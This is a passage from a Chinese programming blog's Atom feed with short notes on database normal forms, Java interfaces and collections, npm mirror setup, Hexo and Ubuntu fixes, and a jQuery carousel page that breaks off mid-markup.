    <content type="html"><![CDATA[<pre><code class="hljs less"><span class="hljs-selector-tag">1</span>. 第一范式（<span class="hljs-selector-tag">1NF</span>）：每一列都是不可分割的原子数据项<span class="hljs-selector-tag">2</span>. 第二范式（<span class="hljs-selector-tag">2NF</span>）：在<span class="hljs-selector-tag">1NF</span>的基础上，非码属性必须完全依赖于码（在<span class="hljs-selector-tag">1NF</span>基础上消除非主属性对主码的部分函数依赖）* 几个概念：<span class="hljs-selector-tag">1</span>. 函数依赖：<span class="hljs-selector-tag">A</span><span class="hljs-selector-tag">--</span>&gt;<span class="hljs-selector-tag">B</span>,如果通过<span class="hljs-selector-tag">A</span>属性(属性组)的值，可以确定唯一<span class="hljs-selector-tag">B</span>属性的值。则称<span class="hljs-selector-tag">B</span>依赖于<span class="hljs-selector-tag">A</span>例如：学号<span class="hljs-selector-tag">--</span>&gt;姓名。  （学号，课程名称） <span class="hljs-selector-tag">--</span>&gt; 分数<span class="hljs-selector-tag">2</span>. 完全函数依赖：<span class="hljs-selector-tag">A</span><span class="hljs-selector-tag">--</span>&gt;<span class="hljs-selector-tag">B</span>， 如果<span class="hljs-selector-tag">A</span>是一个属性组，则<span class="hljs-selector-tag">B</span>属性值得确定需要依赖于<span class="hljs-selector-tag">A</span>属性组中所有的属性值。例如：（学号，课程名称） <span class="hljs-selector-tag">--</span>&gt; 分数<span class="hljs-selector-tag">3</span>. 部分函数依赖：<span class="hljs-selector-tag">A</span><span class="hljs-selector-tag">--</span>&gt;<span class="hljs-selector-tag">B</span>， 如果<span class="hljs-selector-tag">A</span>是一个属性组，则<span class="hljs-selector-tag">B</span>属性值得确定只需要依赖于<span class="hljs-selector-tag">A</span>属性组中某一些值即可。例如：（学号，课程名称） <span class="hljs-selector-tag">--</span> &gt; 姓名<span class="hljs-selector-tag">4</span>. 传递函数依赖：<span class="hljs-selector-tag">A</span><span class="hljs-selector-tag">--</span>&gt;<span class="hljs-selector-tag">B</span>, <span class="hljs-selector-tag">B</span> <span class="hljs-selector-tag">--</span> &gt;<span class="hljs-selector-tag">C</span> . 如果通过<span class="hljs-selector-tag">A</span>属性(属性组)的值，可以确定唯一<span class="hljs-selector-tag">B</span>属性的值，在通过<span class="hljs-selector-tag">B</span>属性（属性组）的值可以确定唯一<span class="hljs-selector-tag">C</span>属性的值，则称 <span class="hljs-selector-tag">C</span> 传递函数依赖于<span class="hljs-selector-tag">A</span>例如：学号<span class="hljs-selector-tag">--</span>&gt;系名，系名<span class="hljs-selector-tag">--</span>&gt;系主任<span class="hljs-selector-tag">5</span>. 码：如果在一张表中，一个属性或属性组，被其他所有属性所完全依赖，则称这个属性(属性组)为该表的码例如：该表中码为：（学号，课程名称）* 主属性：码属性组中的所有属性* 非主属性：除过码属性组的属性<span class="hljs-selector-tag">3</span>. 第三范式（<span class="hljs-selector-tag">3NF</span>）：在<span class="hljs-selector-tag">2NF</span>基础上，任何非主属性不依赖于其它非主属性（在<span class="hljs-selector-tag">2NF</span>基础上消除传递依赖）</code></pre>]]></content>
    
    
    <categories>
      
      <category>数据库</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>简述Comparable和Comparator两个接口的区别。</title>
    <link href="/2020/03/29/%E7%AE%80%E8%BF%B0comparable%E5%92%8Ccomparator%E4%B8%A4%E4%B8%AA%E6%8E%A5%E5%8F%A3%E7%9A%84%E5%8C%BA%E5%88%AB%E3%80%82/index/"/>
    <url>/2020/03/29/%E7%AE%80%E8%BF%B0comparable%E5%92%8Ccomparator%E4%B8%A4%E4%B8%AA%E6%8E%A5%E5%8F%A3%E7%9A%84%E5%8C%BA%E5%88%AB%E3%80%82/index/</url>
    
    <content type="html"><![CDATA[<p>Comparable：强行对实现它的每个类的对象进行整体排序。这种排序被称为类的自然排序，类的compareTo方法<br>被称为它的自然比较方法。只能在类中实现compareTo()一次，不能经常修改类的代码实现自己想要的排序。实现<br>此接口的对象列表（和数组）可以通过Collections.sort（和Arrays.sort）进行自动排序，对象可以用作有序映射中<br>的键或有序集合中的元素，无需指定比较器。<br>Comparator强行对某个对象进行整体排序。可以将Comparator 传递给sort方法（如Collections.sort或<br>Arrays.sort），从而允许在排序顺序上实现精确控制。还可以使用Comparator来控制某些数据结构（如有序set或<br>有序映射）的顺序，或者为那些没有自然顺序的对象collection提供排序。</p>]]></content>
    
    
    <categories>
      
      <category>java</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>数组和集合的区别</title>
    <link href="/2020/03/26/%E6%95%B0%E7%BB%84%E5%92%8C%E9%9B%86%E5%90%88%E7%9A%84%E5%8C%BA%E5%88%AB/index/"/>
    <url>/2020/03/26/%E6%95%B0%E7%BB%84%E5%92%8C%E9%9B%86%E5%90%88%E7%9A%84%E5%8C%BA%E5%88%AB/index/</url>
    
    <content type="html"><![CDATA[<p>一、数组声明了它容纳的元素的类型，而集合不声明。</p><p>二、数组是静态的，一个数组实例具有固定的大小，一旦创建了就无法改变容量了。而集合是可以动态扩展容量，可以根据需要动态改变大小，集合提供更多的成员方法，能满足更多的需求。</p><p>三、数组的存放的类型只能是一种（基本类型/引用类型）,集合存放的类型可以不是一种(不加泛型时添加的类型是Object)。</p><p>四、数组是java语言中内置的数据类型,是线性排列的,执行效率或者类型检查都是最快的。</p>]]></content>
    
    
    <categories>
      
      <category>java</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>abstract与接口的区别</title>
    <link href="/2020/03/23/abstract%E4%B8%8E%E6%8E%A5%E5%8F%A3%E7%9A%84%E5%8C%BA%E5%88%AB/index/"/>
    <url>/2020/03/23/abstract%E4%B8%8E%E6%8E%A5%E5%8F%A3%E7%9A%84%E5%8C%BA%E5%88%AB/index/</url>
    
    <content type="html"><![CDATA[<p>接口(interface)可以说成是抽象类的一种特例,接口中的所有方法都必须是抽象的。接口中的方法定义默认为public abstract类型,接口中的成员变量类型默认为public static final。另外接口和抽象类在方法上有区别。</p><p>1.抽象类可以有构造方法,接口中不能有构造方法。</p><p>2.抽象类中可以包含非抽象的普通方法,接口中的所有方法必须都是抽象的,不能有非抽象的方法。</p><p>3.抽象类中可以有普通成员变量,接口中没有普通成员变量。</p><p>4.抽象类中的抽象方法的访问类型可以是public.protected和默认类型</p><p>5.抽象类中可以包含静态方法,接口不能包含静态方法</p><p>6.抽象类和接口中都可以包含静态成员变量,抽象类中的静态成员变量的访问类型可以任意,但接口中定义的变量只能是public static final 类型,并且默认即为public static final 类型</p><p>7.一个类可以实现多个接口,但是继承一个抽象类。二者在应用方便也有一定的区别：接口更多的是在系统架构设计方法发挥作用,主要用于定义模块之间的通信契约。而抽象类在代码实现方面发挥作用,可以实现代码的重用,例如,模板方法设计模式是抽象类的一个典型应用,假设某个项目的所有Servlet类都要用相同的方法进行权限判断，记录访问日志和异常处理,那么就可以定义一个抽象的基类,让所有的Servlet都继承这个抽象基类,在抽象基类的service方法中玩具城权限判断,记录访问日志和处理异常的代码,在各个子类中只是完成各自的业务逻辑代码</p><p>8.抽象类中的抽象方法和非抽象方法在不加修饰符的情况下，都是默认的default</p>]]></content>
    
    
    <categories>
      
      <category>java</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>A JNI error has occurred,please check your installation and try again</title>
    <link href="/2020/03/22/a-jni-error-has-occurredplease-check-your-installation-and-try-again/index/"/>
    <url>/2020/03/22/a-jni-error-has-occurredplease-check-your-installation-and-try-again/index/</url>
    
    <content type="html"><![CDATA[<p>1.检查包名是不是以java开头的，以java开头的包名就会出现下面这种情况 2.一般这种问题还有一个原因是因为安装了多个java版本，由于编译器与解释器不是同一版本导致，所以检查jdk版本</p>]]></content>
    
    
    <categories>
      
      <category>杂七杂八区</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>java包装类</title>
    <link href="/2020/03/22/java%E5%8C%85%E8%A3%85%E7%B1%BB/index/"/>
    <url>/2020/03/22/java%E5%8C%85%E8%A3%85%E7%B1%BB/index/</url>
    
    <content type="html"><![CDATA[<p>基本类型 基本类型包装类 byte Byte short Short int Integer long Long float Float double Double char Character boolean Boolean</p>]]></content>
    
    
    <categories>
      
      <category>java</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>安装Ubuntu踩坑</title>
    <link href="/2020/03/16/%E5%AE%89%E8%A3%85ubuntu%E8%B8%A9%E5%9D%91/index/"/>
    <url>/2020/03/16/%E5%AE%89%E8%A3%85ubuntu%E8%B8%A9%E5%9D%91/index/</url>
    
    <content type="html"><![CDATA[<p>1.安装VMware Tools选项显示灰色的正确解决办法</p><pre><code class="hljs awk"><span class="hljs-number">1</span>.关闭虚拟机；<span class="hljs-number">2</span>.在虚拟机设置分别设置CD<span class="hljs-regexp">/DVD、CD/</span>DVD2和软盘为自动检测三个步骤；<span class="hljs-number">3</span>.再重启虚拟机，灰色字即点亮。</code></pre><p>2.安装vmwaretools的时候，提取文件到主目录时，提示“没有足够的可用空间来提取vmware-tools<strong>**</strong>.tar.gz</p><pre><code class="hljs plain">1.用归档文件管理器打开2.提取</code></pre>]]></content>
    
    
    <categories>
      
      <category>杂七杂八区</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>npm太慢，更换淘宝镜像</title>
    <link href="/2020/03/15/npm%E5%A4%AA%E6%85%A2%EF%BC%8C%E6%9B%B4%E6%8D%A2%E6%B7%98%E5%AE%9D%E9%95%9C%E5%83%8F/index/"/>
    <url>/2020/03/15/npm%E5%A4%AA%E6%85%A2%EF%BC%8C%E6%9B%B4%E6%8D%A2%E6%B7%98%E5%AE%9D%E9%95%9C%E5%83%8F/index/</url>
    
    <content type="html"><![CDATA[<p>1.临时使用</p><pre><code class="hljs awk">npm --registry https:<span class="hljs-regexp">//</span>registry.npm.taobao.org install express</code></pre><p>2.持久使用</p><pre><code class="hljs arduino">npm <span class="hljs-built_in">config</span> <span class="hljs-built_in">set</span> registry https:<span class="hljs-comment">//registry.npm.taobao.org</span></code></pre><p>配置后可通过下面方式来验证是否成功 npm config get registry 或 npm info express 3.通过cnpm使用</p><pre><code class="hljs awk">npm install -g cnpm --registry=https:<span class="hljs-regexp">//</span>registry.npm.taobao.org</code></pre><p>使用 cnpm install express</p><p>4、npm修改或切换镜像地址 方法一：直接编辑npm配置文件 npm config edit</p><pre><code class="hljs awk"><span class="hljs-number">1416090</span>-<span class="hljs-number">20180621111355013</span>-<span class="hljs-number">1113191392</span>.png直接修改registry的地址：sass_binary_site=https:<span class="hljs-regexp">//</span>npm.taobao.org<span class="hljs-regexp">/mirrors/</span>node-sass/phantomjs_cdnurl=https:<span class="hljs-regexp">//</span>npm.taobao.org<span class="hljs-regexp">/mirrors/</span>phantomjs/electron_mirror=https:<span class="hljs-regexp">//</span>npm.taobao.org<span class="hljs-regexp">/mirrors/</span>electron/registry=https:<span class="hljs-regexp">//</span>registry.npm.taobao.org</code></pre><p>方法二：用代码更改npm的配置文件 npm config set registry <a href="http://registry.npm.taobao.org/">http://registry.npm.taobao.org</a></p><p>方法三：使用nrm管理registry地址</p><p>安装nrm</p><pre><code class="hljs coffeescript"><span class="hljs-built_in">npm</span> i -g nrm</code></pre><p>查看镜像列表</p><pre><code class="hljs ebnf"><span class="hljs-attribute">nrm ls</span></code></pre><p>切换镜像</p><pre><code class="hljs actionscript">nrm <span class="hljs-keyword">use</span> taobao</code></pre><p>在nrm添加自己的镜像地址</p><pre><code class="hljs routeros">nrm <span class="hljs-builtin-name">add</span> r_name r_url</code></pre><p>删除</p><pre><code class="hljs css">nrm <span class="hljs-selector-tag">del</span> r_name</code></pre><p>测试镜像的相应速度</p><pre><code class="hljs bash">nrm <span class="hljs-built_in">test</span> r_name</code></pre>]]></content>
    
    
    <categories>
      
      <category>杂七杂八区</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>安装HEXO后报错：bash: hexo: command not found</title>
    <link href="/2020/03/15/%E5%AE%89%E8%A3%85hexo%E5%90%8E%E6%8A%A5%E9%94%99%EF%BC%9Abash-hexo-command-not-found/index/"/>
    <url>/2020/03/15/%E5%AE%89%E8%A3%85hexo%E5%90%8E%E6%8A%A5%E9%94%99%EF%BC%9Abash-hexo-command-not-found/index/</url>
    
    <content type="html"><![CDATA[<p>安装hexo后， 找到</p><pre><code class="hljs taggerscript">C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\你</span>的用户名<span class="hljs-symbol">\A</span>ppData<span class="hljs-symbol">\R</span>oaming<span class="hljs-symbol">\n</span>pm<span class="hljs-symbol">\n</span>ode_modules<span class="hljs-symbol">\h</span>exo<span class="hljs-symbol">\b</span>in\</code></pre><p>将此目录添加到环境变量中</p>]]></content>
    
    
    <categories>
      
      <category>杂七杂八区</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>轮播图（使用jq插件）</title>
    <link href="/2020/03/14/%E8%BD%AE%E6%92%AD%E5%9B%BE%EF%BC%88%E4%BD%BF%E7%94%A8jq%E6%8F%92%E4%BB%B6%EF%BC%89/index/"/>
    <url>/2020/03/14/%E8%BD%AE%E6%92%AD%E5%9B%BE%EF%BC%88%E4%BD%BF%E7%94%A8jq%E6%8F%92%E4%BB%B6%EF%BC%89/index/</url>
    
    <content type="html"><![CDATA[<pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;Content-Type&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;text/html; charset=utf-8&quot;</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://libs.baidu.com/jquery/2.1.4/jquery.min.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://cdn.bootcss.com/jquery.caroufredsel/6.1.0/jquery.carouFredSel.packed.js&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><span class="javascript">            $(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;</span><span class="javascript">                $(<span class="hljs-string">&#x27;#carousel&#x27;</span>).carouFredSel(&#123;</span><span class="javascript">                    width: <span class="hljs-string">&#x27;100%&#x27;</span>,</span>                    items: &#123;<span class="javascript">                        visible: <span class="hljs-string">&#x27;odd+2&#x27;</span></span>                    &#125;,                    scroll: &#123;<span class="javascript">                        pauseOnHover: <span class="hljs-literal">true</span>,</span><span class="javascript">                        onBefore: <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;</span><span class="javascript">                            $(<span class="hljs-built_in">this</span>).children().removeClass( <span class="hljs-string">&#x27;hover&#x27;</span> );</span>                        &#125;                    &#125;,                    auto: &#123;                        items: 1,<span class="javascript">                        easing: <span class="hljs-string">&#x27;linear&#x27;</span>,</span><span class="javascript">                        duration: <span class="hljs-number">1250</span>,    <span class="hljs-comment">//调节速度</span></span><span class="javascript">                        timeoutDuration: <span class="hljs-number">0</span> <span class="hljs-comment">//停顿时间</span></span>                    &#125;,                    pagination: &#123;<span class="javascript">                        container: <span class="hljs-string">&#x27;#pager&#x27;</span>,</span>                        items: 1,                        duration: 0.5,<span class="javascript">                        queue: <span class="hljs-string">&#x27;last&#x27;</span>,</span><span class="javascript">                        onAfter: <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;</span><span class="javascript">                            <span class="hljs-keyword">var</span> cur = $(<span class="hljs-built_in">this</span>).triggerHandler( <span class="hljs-string">&#x27;currentVisible&#x27;</span> ),</span><span class="javascript">                                mid = <span class="hljs-built_in">Math</span>.floor( cur.length / <span class="hljs-number">2</span> );</span><span class="javascript">                            cur.eq( mid ).addClass( <span class="hljs-string">&#x27;hover&#x27;</span> );</span>                        &#125;                    &#125;                &#125;);            &#125;);        <span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/css&quot;</span>&gt;</span>            #wrapper &#123;<span class="css">                <span class="hljs-attribute">width</span>: <span class="hljs-number">380px</span>;</span>            &#125;            #carousel &#123;<span class="css">                <span class="hljs-attribute">margin-top</span>: -<span class="hljs-number">60px</span>;</span>            &#125;<span class="css">            <span class="hljs-selector-id">#carousel</span> <span class="hljs-selector-tag">div</span> &#123;</span><span class="css">                <span class="hljs-attribute">text-align</span>: center;</span><span class="css">                <span class="hljs-attribute">width</span>: <span class="hljs-number">385px</span>;</span><span class="css">                <span class="hljs-attribute">height</span>: <span class="hljs-number">300px</span>;</span><span class="css">                <span class="hljs-attribute">padding</span>: <span class="hljs-number">0</span> <span class="hljs-number">20px</span>;</span><span class="css">                <span class="hljs-attribute">float</span>: left;</span><span class="css">                <span class="hljs-attribute">position</span>: relative;</span>            &#125;<span class="css">            <span class="hljs-selector-id">#carousel</span> <span class="hljs-selector-tag">div</span> <span class="hljs-selector-tag">img</span> &#123;</span><span class="css">                <span class="hljs-attribute">border</span>: none;</span><span class="css">                <span class="hljs-attribute">width</span>:<span class="hljs-number">385px</span>;</span><span class="css">                <span class="hljs-attribute">height</span>: <span class="hljs-number">300px</span>;</span>            &#125;<span class="css">            <span class="hljs-selector-id">#carousel</span> <span class="hljs-selector-tag">div</span> <span class="hljs-selector-tag">span</span> &#123;</span><span class="css">                <span class="hljs-attribute">display</span>: none;</span>            &#125;<span class="css">            <span class="hljs-selector-id">#carousel</span> <span class="hljs-selector-tag">div</span><span class="hljs-selector-pseudo">:hover</span> <span class="hljs-selector-tag">span</span>,</span><span class="css">            <span class="hljs-selector-id">#carousel</span> <span class="hljs-selector-tag">div</span><span class="hljs-selector-class">.hover</span> <span class="hljs-selector-tag">span</span> &#123;</span><span class="css">                <span class="hljs-attribute">background-color</span>: <span class="hljs-number">#333</span>;</span><span class="css">                <span class="hljs-attribute">color</span>: <span class="hljs-number">#fff</span>;</span><span class="css">                <span class="hljs-attribute">display</span>: inline-block;</span><span class="css">                <span class="hljs-attribute">width</span>: <span class="hljs-number">100px</span>;</span><span class="css">                <span class="hljs-attribute">padding</span>: <span class="hljs-number">2px</span> <span class="hljs-number">0</span>;</span><span class="css">                <span class="hljs-attribute">margin</span>: <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> -<span class="hljs-number">50px</span>;</span><span class="css">                <span class="hljs-attribute">position</span>: absolute;</span><span class="css">                <span class="hljs-attribute">bottom</span>: <span class="hljs-number">0</span>;</span><span class="css">                <span class="hljs-attribute">left</span>: <span class="hljs-number">50%</span>;</span><span class="css">                <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">3px</span>;</span>            &#125;            #pager &#123;<span class="css">                <span class="hljs-attribute">text-align</span>: center;</span><span class="css">                <span class="hljs-attribute">padding-top</span>: <span class="hljs-number">20px</span>;</span>            &#125;<span class="css">            <span class="hljs-selector-id">#pager</span> <span class="hljs-selector-tag">a</span> &#123;</span><span class="css">                <span class="hljs-attribute">background</span>: <span class="hljs-number">#ccc</span>;</span><span class="css">                <span class="hljs-attribute">display</span>: inline-block;</span><span class="css">                <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">5px</span>;</span><span class="css">                <span class="hljs-attribute">width</span>: <span class="hljs-number">10px</span>;</span><span class="css">                <span class="hljs-attribute">height</span>: <span class="hljs-number">10px</span>;</span><span class="css">                <span class="hljs-attribute">margin</span>: <span class="hljs-number">0</span> <span class="hljs-number">2px</span>;</span>            &#125;<span class="css">            <span class="hljs-selector-id">#pager</span> <span class="hljs-selector-tag">a</span><span class="hljs-selector-class">.selected</span> &#123;</span><span class="css">                <span class="hljs-attribute">background</span>: <span class="hljs-number">#999</span>;</span>            &#125;<span class="css">            <span class="hljs-selector-id">#pager</span> <span class="hljs-selector-tag">a</span><span class="hljs-selector-pseudo">:hover</span> &#123;</span><span class="css">                <span class="hljs-attribute">background</span>: <span class="hljs-number">#666</span>;</span>            &#125;<span class="css">            <span class="hljs-selector-id">#pager</span> <span class="hljs-selector-tag">a</span> <span class="hljs-selector-tag">span</span> &#123;</span><span class="css">                <span class="hljs-attribute">display</span>: none;</span>            &#125;            #donate-spacer &#123;<span class="css">                <span class="hljs-attribute">height</span>: <span class="hljs-number">100%</span>;</span>            &#125;            #donate &#123;<span class="css">                <span class="hljs-attribute">width</span>: <span class="hljs-number">750px</span>;</span><span class="css">                <span class="hljs-attribute">padding</span>: <span class="hljs-number">50px</span> <span class="hljs-number">75px</span>;</span><span class="css">                <span class="hljs-attribute">margin</span>: <span class="hljs-number">0</span> auto;</span><span class="css">                <span class="hljs-attribute">overflow</span>: hidden;</span>            &#125;<span class="css">            <span class="hljs-selector-id">#donate</span> <span class="hljs-selector-tag">p</span>, <span class="hljs-selector-id">#donate</span> <span class="hljs-selector-tag">form</span> &#123;</span><span class="css">                <span class="hljs-attribute">margin</span>: <span class="hljs-number">0</span>;</span><span class="css">                <span class="hljs-attribute">float</span>: left;</span>            &#125;<span class="css">            <span class="hljs-selector-id">#donate</span> <span class="hljs-selector-tag">p</span> &#123;</span><span class="css">                <span class="hljs-attribute">width</span>: <span class="hljs-number">650px</span>;</span>            &#125;<span class="css">            <span class="hljs-selector-id">#donate</span> <span class="hljs-selector-tag">form</span> &#123;</span><span class="css">                <span class="hljs-attribute">width</span>: <span class="hljs-number">100px</span>;</span>            &#125;        <span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;wrapper&quot;</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;carousel&quot;</span>&gt;</span>                <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>                    <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;img/1.png&quot;</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">&quot;fruit1&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;200&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;200&quot;</span> /&gt;</span>                    <span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>Apple<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>                <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>                <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>                    <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;img/2.png&quot;</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">&quot;fruit2&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;200&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;200&quot;</span> /&gt;</span>                    <span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>Mandarin<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>                <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>                <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>                    <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;img/3.png&quot;</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">&quot;fruit3&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;200&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;200&quot;</span> /&gt;</span>                    <span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>Banannas<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>                <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>                <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>                    <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;img/4.png&quot;</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">&quot;fruit4&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;200&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;200&quot;</span> /&gt;</span>                    <span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>Cherries<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>                <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>                <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>                    <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;img/5.png&quot;</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">&quot;fruit5&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;200&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;200&quot;</span> /&gt;</span>                    <span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>Orange<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>                <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>                <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>                    <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;img/6.png&quot;</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">&quot;fruit6&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;200&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;200&quot;</span> /&gt;</span>                    <span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>Melon<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>                <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>                <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>                    <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;img/7.png&quot;</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">&quot;fruit7&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;200&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;200&quot;</span> /&gt;</span>                    <span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>Lemon<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>                <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>                <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>                    <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;img/8.png&quot;</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">&quot;fruit8&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;200&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;200&quot;</span> /&gt;</span>                    <span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>Grapes<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>                <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>                <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>                    <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;img/9.png&quot;</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">&quot;fruit9&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;200&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;200&quot;</span> /&gt;</span>                    <span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>Peach<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>                <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>                <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>                    <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;img/10.png&quot;</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">&quot;fruit10&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;200&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;200&quot;</span> /&gt;</span>                    <span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>Pear<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>                <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>                <span 